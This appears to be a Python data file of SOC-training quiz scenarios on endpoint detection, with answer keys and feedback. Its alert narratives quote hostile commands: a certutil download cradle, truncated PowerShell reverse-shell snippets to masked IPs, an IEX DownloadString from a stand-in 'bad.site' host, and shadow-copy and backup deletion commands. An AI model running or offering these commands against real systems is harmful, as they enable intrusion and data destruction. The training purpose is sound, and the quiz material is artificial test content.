"""
Domain 5: Endpoint Detection & Response scenarios.

Key SOC concepts tested:
- LOLBin abuse detection
- Process tree analysis
- Persistence mechanism identification
- Credential dumping detection
- Ransomware behavior patterns
- Fileless malware detection
- Registry modification monitoring
- EDR alert investigation

Each scenario uses a single "standard" professional theme.
"""

SOC_DOMAIN_5_SCENARIOS = [
    # Scenario 1: LOLBin Detection
    {
        "id": "soc5_lolbin",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "LIVING OFF THE LAND",
                "narrative": """
Your EDR solution alerts on suspicious process execution:

Parent Process: outlook.exe (user: jsmith)
Child Process: certutil.exe
Command Line: certutil.exe -urlcache -split -f http://185.XX.XX.XX/update.txt
              C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe

The user jsmith is an accountant who primarily uses Excel and email. The EDR
shows no malicious file detections - certutil.exe is a legitimate Windows binary.

What is the MOST accurate assessment of this activity?
                """,
                "choices": [
                    {"text": "Normal Windows update activity - certutil manages certificates"},
                    {"text": "LOLBin abuse - using legitimate tools for malicious download"},
                    {"text": "False positive - legitimate Windows binaries can't be malicious"},
                    {"text": "User troubleshooting - they're probably fixing certificate issues"}
                ],
                "success_text": """
"LOLBin abuse," you confirm. "Certutil's urlcache function is being used to
download a file from an external IP and save it as svchost.exe."

Your analysis:
1. PARENT: Outlook spawning certutil? Email shouldn't manage certificates.
2. COMMAND: -urlcache -split -f downloads files. This isn't certificate management.
3. DESTINATION: External IP, not Microsoft infrastructure.
4. OUTPUT: Saving as svchost.exe in Temp folder - classic masquerading.
5. CONTEXT: An accountant has no legitimate need for this.

The EDR didn't flag certutil.exe because it's a signed Microsoft binary. That's
exactly why attackers use it - LOLBins evade signature-based detection.

You contain the workstation and find the downloaded file is a RAT. The attack
began with a phishing email containing a macro that invoked certutil.

LOLBIN PRINCIPLE: Legitimate binaries can be abused for malicious purposes.
Detection requires understanding CONTEXT, not just trusting signatures.
                """,
                "failure_texts": {
                    0: """
Certutil CAN manage certificates, but "-urlcache -split -f" downloads files from
URLs, not manage certificates.

Windows Update doesn't use certutil. Legitimate updates come from Microsoft CDNs,
not random external IPs saving files named "svchost.exe."

LESSON: Know what tools actually do. Certutil is frequently abused as a download
cradle.
                    """,
                    2: """
"Legitimate binaries can't be malicious" is exactly what attackers exploit!
Living Off the Land uses signed Windows tools to perform malicious actions.

The BINARY isn't malicious. The USAGE is. Certutil downloading from an external
IP and saving as svchost.exe is textbook adversary technique.

LESSON: Context determines malice. Trust behavior, not signatures.
                    """,
                    3: """
An accountant troubleshooting certificates by having Outlook spawn certutil to
download from a random IP and save as "svchost.exe"?

That's not troubleshooting. That's a phishing macro executing a LOLBin download
cradle.

LESSON: Apply common sense. What would a normal user ACTUALLY do?
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
LOLBins (Living Off the Land Binaries):
- Signed by Microsoft or other trusted vendors
- Built-in to Windows
- Have legitimate purposes
- Can be abused for malicious actions

Common: certutil, mshta, regsvr32, rundll32, msiexec, bitsadmin
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - LOLBin Abuse Detection"
    },

    # Scenario 2: Process Tree Analysis
    {
        "id": "soc5_process_tree",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE UNUSUAL PARENT",
                "narrative": """
Your EDR dashboard shows a process tree that caught your attention:

```
System
 └── services.exe
      └── svchost.exe (netsvcs)
           └── WmiPrvSE.exe
                └── powershell.exe
                     └── cmd.exe
                          └── whoami.exe
                          └── net.exe (net user /domain)
                          └── nltest.exe (/dclist:)
```

The activity originated from WKSTN-DEV-089 at 2:34 AM local time. The machine
belongs to a developer who typically works 9-5.

What does this process tree MOST likely indicate?
                """,
                "choices": [
                    {"text": "Normal administrative activity - IT running maintenance scripts"},
                    {"text": "System process malfunction - WmiPrvSE shouldn't spawn PowerShell"},
                    {"text": "Post-exploitation reconnaissance - attacker enumerating the domain"},
                    {"text": "Developer testing - they're probably writing a DevOps script"}
                ],
                "success_text": """
"Post-exploitation reconnaissance," you report. "This is textbook MITRE ATT&CK
Discovery phase - whoami, net user, nltest for domain enumeration."

Your analysis:
1. WmiPrvSE spawning PowerShell = Remote WMI execution (T1047)
2. whoami = Account discovery (T1033)
3. net user /domain = Domain user enumeration (T1087.002)
4. nltest /dclist = Domain trust discovery (T1482)

"The attacker compromised something with WMI access and is figuring out the
domain layout. This is preparation for lateral movement."

Timeline: 2:34 AM from a 9-5 developer's machine. Either the developer is
working very late, or someone else is using their access.

You initiate containment. Forensics reveals the attacker gained access via a
compromised service account using WMI for fileless execution.

PROCESS TREE PRINCIPLE: Parent-child relationships reveal execution context.
WMI→PowerShell→reconnaissance is a red flag pattern, especially off-hours.
                """,
                "failure_texts": {
                    0: """
IT maintenance at 2:34 AM through a developer's workstation using WMI to spawn
PowerShell? That's not how legitimate administration works.

IT uses their own admin workstations, documents maintenance, and doesn't run
manual discovery commands (whoami, net user).

LESSON: Legitimate admin activity has context. This doesn't match.
                    """,
                    1: """
WmiPrvSE spawning PowerShell isn't a malfunction - it's exactly how remote WMI
execution works. The question is: who initiated it and why?

This is WORKING AS DESIGNED for remote management. The concern is the subsequent
reconnaissance activity.

LESSON: Understand legitimate process chains to recognize abuse.
                    """,
                    3: """
DevOps testing at 2:34 AM by running whoami, net user, and nltest manually through
WMI? DevOps scripts are automated and scheduled.

Also, developers test on their OWN machine or dev environments, not through WMI
remote execution.

LESSON: Apply common sense. This pattern matches attack techniques, not DevOps.
                    """
                }
            }
        },
        "correct_index": 2,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Process tree red flags:
- Office apps spawning scripting engines
- WMI spawning command shells
- Discovery commands in sequence
- Off-hours activity on non-IT systems

The chain of execution reveals intent.
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - Process Tree Analysis"
    },

    # Scenario 3: Persistence Mechanism
    {
        "id": "soc5_persistence",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE REGISTRY MODIFICATION",
                "narrative": """
Your EDR alerts on a registry modification:

System: WKSTN-SALES-015
User Context: SYSTEM
Registry Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
Value Name: WindowsDefenderUpdate
Value Data: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBq...

The encoded PowerShell translates to:
$client = New-Object System.Net.Sockets.TCPClient('185.X.X.X',4444);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};...

The modification occurred at 11:47 PM. The sales user's normal hours are 8-5.

What does this represent?
                """,
                "choices": [
                    {"text": "Windows Defender update registration - legitimate security software"},
                    {"text": "Persistence mechanism - reverse shell set to run at startup"},
                    {"text": "IT management tool - remote support software configuration"},
                    {"text": "Application auto-start - legitimate software using Run key"}
                ],
                "success_text": """
"Persistence mechanism," you confirm. "This is a reverse shell that will execute
every time the system starts."

Your analysis:
- REGISTRY KEY: CurrentVersion\\Run executes at every user login
- NAME: "WindowsDefenderUpdate" mimics legitimate software (masquerading)
- ENCODED POWERSHELL: Obfuscation to hide malicious intent
- DECODED CONTENT: TCP client to external IP port 4444 = reverse shell
- TIMING: 11:47 PM, well outside user's work hours
- SYSTEM CONTEXT: Elevated privileges

The attacker has:
1. Compromised the system
2. Established persistence via Run key
3. Ensured their reverse shell survives reboots
4. Disguised it as Windows Defender

You isolate the system and begin remediation: remove the registry key, investigate
initial access, and search for other persistence mechanisms.

PERSISTENCE PRINCIPLE: Attackers establish persistence to maintain access. Run keys
are common because they're simple, reliable, and execute automatically.
                """,
                "failure_texts": {
                    0: """
Windows Defender doesn't register itself as "WindowsDefenderUpdate" in the Run key.
Windows Defender is a service, not a Run key application.

Also, the encoded PowerShell creates a TCP socket to an external IP. That's not
how legitimate security software works.

LESSON: Verify claims against actual behavior. This isn't Defender.
                    """,
                    2: """
IT management tools:
- Come from known vendors with signed installers
- Don't use encoded PowerShell
- Don't create raw TCP sockets to unknown IPs
- Are deployed through managed processes, not runtime registry edits

This is malware, not IT management.

LESSON: Know what legitimate tools look like.
                    """,
                    3: """
Legitimate applications using Run keys:
- Install via signed installers
- Reference actual executables, not encoded PowerShell
- Document their registry usage
- Don't create reverse shells to external IPs

This is persistence for a backdoor, not legitimate auto-start.

LESSON: Examine what's actually being executed, not just the key location.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Common persistence mechanisms:
- Run/RunOnce registry keys
- Scheduled Tasks
- Services
- Startup folder
- WMI subscriptions
- DLL hijacking

Look for: Encoded commands, external connections, off-hours modifications.
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - Persistence Mechanism Identification"
    },

    # Scenario 4: Credential Dumping
    {
        "id": "soc5_credential_dump",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE LSASS ACCESS",
                "narrative": """
Your EDR generates a high-severity alert:

Alert: Suspicious LSASS Memory Access
Source Process: notepad.exe (PID 4892)
Target Process: lsass.exe (PID 568)
Access Type: PROCESS_VM_READ
User: DOMAIN\\admin_service

The admin_service account is a service account used for automated deployments.
This activity occurred at 3:15 AM on a domain controller.

Why is this alert significant?
                """,
                "choices": [
                    {"text": "False positive - LSASS is accessed by many legitimate processes"},
                    {"text": "Credential dumping attempt - notepad.exe reading LSASS memory is abnormal"},
                    {"text": "Normal debugging - administrators sometimes debug system processes"},
                    {"text": "Antivirus scanning - security software scans LSASS for malware"}
                ],
                "success_text": """
"Credential dumping," you confirm. "Notepad.exe has NO legitimate reason to read
LSASS memory. This is almost certainly a code injection attack."

Your analysis:
- LSASS: Local Security Authority Subsystem Service stores credentials in memory
- NOTEPAD.EXE: Text editor has no reason to access LSASS
- PROCESS_VM_READ: Reading memory = extracting credentials
- SERVICE ACCOUNT: Compromised high-privilege account
- DOMAIN CONTROLLER: Highest-value target for credential theft

Attack pattern:
1. Attacker compromised admin_service account
2. Injected code into notepad.exe (or renamed their tool)
3. Reading LSASS memory to extract cached credentials
4. Will use credentials for lateral movement

Common tools that do this: Mimikatz, ProcDump, comsvcs.dll MiniDump

You isolate the DC and begin credential reset procedures for all accounts that
may have been cached.

CREDENTIAL DUMPING PRINCIPLE: LSASS contains cached credentials. Any unexpected
process reading LSASS memory is a critical security event.
                """,
                "failure_texts": {
                    0: """
Some processes DO access LSASS legitimately (security software, AD tools), but
NOTEPAD.EXE is not one of them.

Text editors don't access security authority processes. This is clearly anomalous.

LESSON: Know which processes legitimately access LSASS. Notepad isn't one.
                    """,
                    2: """
"Normal debugging" of LSASS at 3:15 AM by a service account using notepad.exe?

Debugging uses debugging tools (WinDbg, Visual Studio Debugger), not text editors.
And it's documented, authorized, and doesn't happen in the middle of the night.

LESSON: Debugging has recognizable patterns. This isn't debugging.
                    """,
                    3: """
Antivirus software has:
- Signed binaries from security vendors
- Documented LSASS access patterns
- Its own process name, not "notepad.exe"

Antivirus doesn't inject into notepad to scan LSASS.

LESSON: Security software is recognizable. This is attack behavior.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Credential dumping indicators:
- Unexpected processes accessing LSASS
- PROCESS_VM_READ access to lsass.exe
- Known tools: Mimikatz, ProcDump, comsvcs.dll
- Process name mismatches (notepad doing security operations)

LSASS access by non-security software is always suspicious.
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - Credential Dumping Detection"
    },

    # Scenario 5: Ransomware Behavior
    {
        "id": "soc5_ransomware",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE ENCRYPTION STORM",
                "narrative": """
Your EDR triggers multiple alerts in rapid succession from WKSTN-ACCT-007:

Alert 1: vssadmin.exe delete shadows /all /quiet
Alert 2: bcdedit.exe /set {default} recoveryenabled No
Alert 3: wbadmin.exe DELETE SYSTEMSTATEBACKUP -deleteOldest
Alert 4: File entropy increase detected in C:\\Users\\* (500+ files/minute)
Alert 5: Ransom note created: README_RESTORE_FILES.txt

The user called help desk: "All my files have weird extensions and won't open!"

What is the appropriate immediate response?
                """,
                "choices": [
                    {"text": "Contact the user to verify before taking action"},
                    {"text": "Isolate the system immediately - active ransomware execution"},
                    {"text": "Run antivirus scan to identify the malware"},
                    {"text": "Restore files from the most recent backup"}
                ],
                "success_text": """
"Isolate immediately," you respond, executing network isolation within seconds.

Your analysis - classic ransomware behavior chain:
1. VSSADMIN: Deleting shadow copies prevents local recovery
2. BCDEDIT: Disabling recovery mode prevents Windows recovery
3. WBADMIN: Deleting backup catalog removes restoration points
4. ENTROPY INCREASE: Encryption changes file randomness
5. RANSOM NOTE: Attacker's payment demand

This is ACTIVE RANSOMWARE. Every second of delay means more encrypted files.

Isolation actions:
- EDR containment (block all network communications)
- Network switch port shutdown (hardware isolation)
- Document the state for forensics

Next steps:
- Determine if other systems are affected
- Check for lateral movement indicators
- Begin backup restoration assessment
- Preserve evidence from isolated system

You contained the damage to one workstation. Without immediate isolation, the
ransomware would have spread via network shares.

RANSOMWARE RESPONSE: Speed is everything. Shadow copy deletion + encryption +
ransom note = isolate FIRST, investigate later.
                """,
                "failure_texts": {
                    0: """
The user ALREADY called help desk saying files won't open. The EDR shows active
encryption. What more verification do you need?

Every second you "verify," the ransomware encrypts more files and potentially
spreads to network shares.

LESSON: When indicators are this clear, act first. Verify in parallel.
                    """,
                    2: """
Running an antivirus scan DURING ACTIVE ENCRYPTION? The AV might detect the
ransomware (it might not - evasion is common), but it won't decrypt your files.

Meanwhile, encryption continues at 500+ files/minute.

LESSON: Antivirus is prevention, not response. Isolation is response.
                    """,
                    3: """
Restoring from backup is the RIGHT eventual action, but the WRONG immediate action.

If you restore files while ransomware is still active:
- New files get encrypted
- Restored files get re-encrypted
- Backup connections might spread the ransomware

Contain FIRST, restore AFTER containment.

LESSON: Restoration requires a clean environment. Isolate before restoring.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Ransomware behavior indicators:
- Shadow copy deletion (vssadmin, wmic)
- Recovery disabling (bcdedit)
- Backup deletion (wbadmin)
- Mass file entropy changes
- Ransom note creation

Response: ISOLATE immediately. Speed prevents spread.
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - Ransomware Behavior Patterns"
    },

    # Scenario 6: Fileless Malware
    {
        "id": "soc5_fileless",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE INVISIBLE THREAT",
                "narrative": """
Your EDR shows suspicious PowerShell activity but no malware files on disk:

Process: powershell.exe
Command: IEX (New-Object Net.WebClient).DownloadString('http://bad.site/payload')
Parent: WScript.exe
Memory: Shellcode detected in PowerShell process memory
Network: Beaconing to 185.X.X.X every 60 seconds
Disk: No suspicious files found in any standard malware locations

Traditional antivirus shows "No threats found." The system appears normal to users.

What type of attack is this, and why is it challenging to detect?
                """,
                "choices": [
                    {"text": "Not an attack - AV is clean, just suspicious scripting"},
                    {"text": "Fileless malware - lives in memory, leaves no disk artifacts"},
                    {"text": "False positive - PowerShell commands aren't inherently malicious"},
                    {"text": "Adware - downloading content from the internet"}
                ],
                "success_text": """
"Fileless malware," you confirm. "The attacker's code lives entirely in memory.
No files on disk means traditional AV has nothing to scan."

Fileless malware characteristics:
- EXECUTION: PowerShell/WScript downloads code directly into memory
- PERSISTENCE: May use registry, WMI, or scheduled tasks (not file-based)
- DETECTION: No malware files for AV to signature-match
- EVIDENCE: Lives in volatile memory, disappears on reboot (unless persistent)

Your attack chain:
1. Initial access via malicious script (WScript)
2. PowerShell downloads payload directly to memory (no file)
3. Shellcode executes in PowerShell's memory space
4. C2 beaconing establishes command channel

Detection strategy:
- Behavior-based EDR (like yours) catches process relationships
- Memory scanning finds shellcode
- Network monitoring catches beaconing
- Traditional AV MISSES IT because there's no file

You contain the system and capture memory for forensics before the evidence
disappears.

FILELESS PRINCIPLE: No file on disk doesn't mean no malware. Advanced threats
live in memory, abuse legitimate tools, and evade file-based detection.
                """,
                "failure_texts": {
                    0: """
"AV is clean" means nothing for fileless malware. AV scans FILES. Fileless
malware lives in MEMORY.

The shellcode in PowerShell's memory, the beaconing, the suspicious download
command - these are all malware indicators that don't require files.

LESSON: Clean AV scan ≠ clean system. Memory-resident threats evade file scanning.
                    """,
                    2: """
The PowerShell command downloads and EXECUTES arbitrary code from the internet.
The process has SHELLCODE IN MEMORY. It's BEACONING to external IPs.

This isn't "not inherently malicious" - this is textbook malware behavior.

LESSON: Context matters. DownloadString + IEX + shellcode + beaconing = malware.
                    """,
                    3: """
Adware:
- Shows advertisements
- Is typically file-based
- Doesn't inject shellcode into processes
- Doesn't beacon to C2 servers

This has command-and-control beaconing, shellcode injection, and obfuscated
download patterns. It's not adware.

LESSON: Understand threat categories. This is sophisticated malware, not adware.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Fileless malware characteristics:
- No malicious files on disk
- Lives in process memory
- Uses legitimate tools (PowerShell, WMI, WScript)
- Evades file-based antivirus
- Detected through behavior and memory analysis

"No file" ≠ "no malware"
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - Fileless Malware Detection"
    },

    # Scenario 7: EDR Alert Workflow
    {
        "id": "soc5_edr_workflow",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE ALERT QUEUE",
                "narrative": """
Your EDR dashboard shows three alerts. You need to prioritize investigation:

Alert A: "PowerShell execution with base64 encoding"
- System: WKSTN-DEV-023 (Developer workstation)
- Time: 10:30 AM (business hours)
- User: Developer (known to use PowerShell scripts)
- Command: Install-Module from PowerShell Gallery

Alert B: "LSASS memory access by unknown process"
- System: DC-PROD-01 (Domain Controller)
- Time: 3:15 AM
- User: Service account
- Process: svchost.exe variant (unusual path)

Alert C: "Suspicious file download via certutil"
- System: WKSTN-HR-047 (HR Coordinator workstation)
- Time: 11:45 AM (business hours)
- User: HR Coordinator
- Command: certutil downloading from external IP

Which alert requires IMMEDIATE investigation?
                """,
                "choices": [
                    {"text": "Alert A - PowerShell with encoding is always suspicious"},
                    {"text": "Alert B - LSASS access on domain controller is critical"},
                    {"text": "Alert C - HR user shouldn't be using certutil"},
                    {"text": "Investigate all three equally - don't prioritize"}
                ],
                "success_text": """
"Alert B - immediately," you respond. "LSASS access on a domain controller by an
unknown process at 3 AM is the highest severity."

Your prioritization logic:

ALERT B (INVESTIGATE NOW):
- TARGET: Domain Controller (highest-value asset)
- ACTION: LSASS memory access (credential theft)
- TIMING: 3:15 AM (off-hours, suspicious)
- CONTEXT: Unknown svchost variant (process masquerading)
- IMPACT: Domain compromise could affect entire organization

Alert C (High priority, after B):
- HR user using certutil is abnormal
- External download is concerning
- Business hours reduces likelihood but doesn't eliminate it

Alert A (Lower priority):
- Developer using PowerShell is expected
- Install-Module from PowerShell Gallery is legitimate
- Business hours, known user, expected behavior
- Likely false positive

You contain DC-PROD-01 and find credential harvesting malware. The attacker
had been in the environment for a week. Alert B caught them before domain-wide
compromise.

PRIORITIZATION PRINCIPLE: Target value + action severity + context = priority.
Domain Controller + credential theft + off-hours = investigate immediately.
                """,
                "failure_texts": {
                    0: """
Alert A is a developer using PowerShell to install modules - that's expected
behavior. Developers use PowerShell; that's not suspicious in context.

Meanwhile, Alert B shows credential theft on your domain controller.

LESSON: Context matters. Developer PowerShell is normal; DC LSASS access is not.
                    """,
                    2: """
Alert C is concerning (HR shouldn't use certutil), but Alert B is critical:
- Domain Controller vs. workstation (value)
- Credential theft vs. download (impact)
- 3 AM vs. business hours (timing)

HR certutil is bad. DC credential theft is catastrophic.

LESSON: Prioritize by impact. Workstation compromise < DC compromise.
                    """,
                    3: """
"Investigate equally" means you might spend time on the developer's legitimate
PowerShell use while an attacker dumps domain credentials.

Triage exists for a reason. Resources are limited. Prioritize by impact.

LESSON: Not all alerts are equal. Critical assets + high-severity actions =
investigate first.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
EDR alert prioritization factors:
1. TARGET VALUE - What system is affected?
2. ACTION SEVERITY - What is being done?
3. CONTEXT - Is this expected for this user/system?
4. TIMING - Business hours or suspicious timing?

Domain controllers, credential access, and off-hours activity = highest priority.
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - EDR Alert Investigation Workflow"
    },

    # Scenario 8: Scheduled Task Persistence
    {
        "id": "soc5_scheduled_task",
        "domain": 5,
        "themes": {
            "standard": {
                "title": "THE SCHEDULED MYSTERY",
                "narrative": """
Your EDR detects a new scheduled task creation:

System: WKSTN-FIN-031 (Finance analyst workstation)
Task Name: GoogleChromeUpdate
Trigger: At user logon
Action: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File
        C:\\ProgramData\\Google\\update.ps1
Created By: SYSTEM
Creation Time: 2:47 AM

The update.ps1 file contains:
$c=New-Object Net.Sockets.TCPClient('185.X.X.X',443);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){...}

Google Chrome is installed on this system. What is your assessment?
                """,
                "choices": [
                    {"text": "Legitimate Chrome update mechanism using PowerShell"},
                    {"text": "Malicious persistence - reverse shell disguised as Chrome update"},
                    {"text": "IT automation - scheduled scripts are common for updates"},
                    {"text": "False positive - Google legitimately uses scheduled tasks"}
                ],
                "success_text": """
"Malicious persistence," you confirm. "This is a reverse shell disguised as
a Chrome update."

Your analysis:
- TASK NAME: "GoogleChromeUpdate" mimics legitimate software (masquerading)
- CREATION TIME: 2:47 AM (Finance analyst isn't working)
- HIDDEN WINDOW: -WindowStyle Hidden hides execution from user
- BYPASS: -ExecutionPolicy Bypass overrides security settings
- SCRIPT CONTENT: TCP socket to external IP = reverse shell
- TRIGGER: At logon ensures persistence

Real Google Chrome updates:
- Use Google Update Service (GoogleUpdate.exe)
- Don't use PowerShell scripts
- Don't create TCP sockets to unknown IPs
- Are signed by Google

This is textbook persistence:
1. Attacker gained access
2. Created scheduled task for persistence
3. Named it to blend in
4. Reverse shell activates on every login

You remediate: Remove the task, delete the script, investigate initial access.

SCHEDULED TASK PRINCIPLE: Attackers use scheduled tasks because they're reliable
and survive reboots. Examine task actions carefully - names can be deceptive.
                """,
                "failure_texts": {
                    0: """
Google Chrome does NOT update via PowerShell scripts creating TCP sockets. Chrome
uses Google Update Service with signed executables.

The script creates a reverse shell to an external IP. That's not an update.

LESSON: Know how legitimate software actually works.
                    """,
                    2: """
IT automation:
- Uses documented, approved scripts
- Runs from managed infrastructure
- Doesn't create reverse shells to external IPs
- Is deployed through change management

A hidden PowerShell reverse shell on a finance workstation is not IT automation.

LESSON: Automation has recognizable patterns. This doesn't match.
                    """,
                    3: """
Google does use scheduled tasks for updates, but NOT like this:
- Real Google tasks run GoogleUpdate.exe (signed)
- Real Google tasks don't use PowerShell
- Real Google tasks don't connect to random IPs

The task NAME is designed to deceive. Examine the ACTION.

LESSON: Attackers mimic legitimate software names. Verify the actual behavior.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Scheduled task persistence indicators:
- Deceptive task names (mimicking legitimate software)
- PowerShell with hidden windows and bypass flags
- Network connections in task actions
- Off-hours creation times
- Actions that don't match the task name

Names deceive; actions reveal truth.
        """,
        "domain_reference": "SOC Domain 5: Endpoint Detection - Scheduled Task Persistence"
    }
]
